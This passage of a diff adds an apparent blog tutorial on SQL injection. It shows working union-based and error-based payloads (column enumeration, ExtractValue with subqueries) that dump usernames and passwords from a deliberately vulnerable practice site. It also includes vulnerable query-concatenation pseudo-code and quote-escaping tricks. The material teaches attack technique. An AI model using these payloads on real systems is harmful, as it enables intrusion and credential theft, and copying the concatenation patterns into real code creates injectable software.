+&lt;p&gt;Now lets imply this method to the acuart database. 
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name=&amp;quot;users&amp;quot;&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name=&quot;users&quot;&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql13.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+We now have got all the column names in the ‘users’ table, ‘uname’ and ‘pass’ columns are intresting : )
+&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;extracting-values-from-columns&quot;&gt;Extracting values from columns&lt;/h3&gt;
+&lt;p&gt;After this point, our aim is certain, and simple. We need to get ‘uname’ and ‘pass’ fields in users table.
+One simple query to get those values, for example just like this.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;testdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak2&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak3&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So lets imply this to acuart.
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat(&amp;quot;Username:&amp;quot;,uname, &amp;quot; Password:&amp;quot;,pass),8,9,10,11 FROM users&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat(&quot;Username:&quot;,uname, &quot; Password:&quot;,pass),8,9,10,11 FROM users&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql14.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;strong&gt;Congrats !!&lt;/strong&gt; we got the username and password fields.&lt;/p&gt;
+&lt;h3 id=&quot;concat-method&quot;&gt;Concat method&lt;/h3&gt;
+&lt;p&gt;As you see above, I used concat for string formatting.Lets see how it is working from our example database.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;testdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;FN:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;  LN:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-------------------------------------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;FN:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;  LN:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-------------------------------------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Burak&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;LN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Baris&lt;/span&gt;                        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Burak2&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;LN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Baris2&lt;/span&gt;                      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Burak3&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;LN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Baris3&lt;/span&gt;                      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-------------------------------------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;guess-correction&quot;&gt;Guess correction&lt;/h3&gt;
+&lt;p&gt;As you remember, at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Guessing the design&lt;/code&gt; heading, we come up with a possible query that runs at the server
+just by observing the behaviour of the web application. After doing more scans in the database, I see that, that guess
+we made above, is kind of close to the real design.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1&lt;/a&gt;
+&lt;br /&gt;
+Gives the same result as:
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=1&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=1&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnweb---error-based-sqli&quot;&gt;VULNWEB - ERROR BASED SQLi&lt;/h2&gt;
+
+&lt;p&gt;As you remember, this is the pseudo code for testphp.vulnweb website.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT (some unknown column names) FROM listproducts WHERE cat=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#Try:
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#Except:
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#pass
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I have added those comment lines intentionally.If we had those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Try&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Except&lt;/code&gt; lines, or any other exception handling method
+with another language that is used in the server side code, we could not have see this error message.
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/15.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+Spesifically speaking for the pseudo code above, when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute(query)&lt;/code&gt; method returns a result to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;result&lt;/code&gt; variable from database. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if result.size()&amp;gt;0&lt;/code&gt; means that, if we have returned something from query, print it,
+it can be both the intented and expected query result, or in this case an error message. If we had an exception handling, result
+variable would not be declared at all if the query result is not accurate.
+&lt;br /&gt;
+This is a &lt;strong&gt;catastrophic mis-coding&lt;/strong&gt; for the server, because we can use this error message to extract data from it.
+&lt;br /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;extract-value-method&quot;&gt;Extract value method&lt;/h3&gt;
+
+&lt;p&gt;As in the example, database return the unexpected string in error message. That means that, we see what we give in the input
+field.Instead of seeing what we give as a string, it is possible that to return values from database.&lt;br /&gt;
+There is a helper function that we can use, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractValue()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))&lt;/a&gt;
+&lt;br /&gt;
+Query will look like this on the server side.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;some&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unknown&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;column&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;names&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listproducts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractvalue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql16.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+This time we have returned a function result as an error message and modified the function as we wanted.
+&lt;br /&gt;
+As you can see from the picure, result of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database()&lt;/code&gt; helper function &lt;strong&gt;acuart&lt;/strong&gt; is in the error message.&lt;/p&gt;
+&lt;h3 id=&quot;extract-value-with-subquery&quot;&gt;Extract value with subquery&lt;/h3&gt;
+&lt;p&gt;Instead of passing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database()&lt;/code&gt; function as a second argument for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractValue()&lt;/code&gt; method, creating subquery with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;()&lt;/code&gt; will
+allow you to write your own queries.
+&lt;br /&gt;
+&lt;strong&gt;I am assuming that you read the previous chapters and got the table names already for this example.&lt;/strong&gt;
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))&lt;/a&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql17.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;1-and-11--and-1--or-11-&quot;&gt;(1’ and 1=1 #) AND (1 ‘ or 1=1 #)&lt;/h2&gt;
+
+&lt;p&gt;We have figured out the existence of the SQLi with &lt;strong&gt;2-1&lt;/strong&gt;.However this due to the fact that, the code at the backend is
+written in this syntax:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM news WHERE id =&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;When we make a request to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.xyz.com/?id=2-1&lt;/code&gt;, the server side code interpret and runs query like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;news&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;--Which returns&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;However the code could have  written like this either:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT (some unknown column names) FROM listproducts WHERE cat =&apos;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&apos;&quot;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#OR
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT (some unknown column names) FROM listproducts WHERE cat  =&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;When this is the case, if you pass &lt;strong&gt;2-1&lt;/strong&gt; to the parameter and make the same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.xyz.com/?id=2-1&lt;/code&gt; request,
+the query would interpreted like the following, because string formatting is different in this case. As 
+we discussed, both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;1&apos;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; parameters passed to the query will return the same result but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;2-1&apos;&lt;/code&gt; will not.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;news&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;2-1&apos;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;--Which returns&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-----+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;When this is the case, we need to escape those single quotes which are surrounding the parameter in order to make our own operations
+on the database. 
+&lt;br /&gt;
+This is where we need to use those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;or 1=1 #&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;and 1=1 #&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Let me remind you the discipline we should follow&lt;/strong&gt;
+&lt;br /&gt;
+1-Declare a reference point
+&lt;br /&gt;
+2-Try to get back there with an unexpected behavior
+&lt;br /&gt;
+Lets use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=1 #&lt;/code&gt; to make the request like this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.xyz.com/?id=1&apos; and1=1 #&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM news WHERE id =&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; and 1=1 #&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
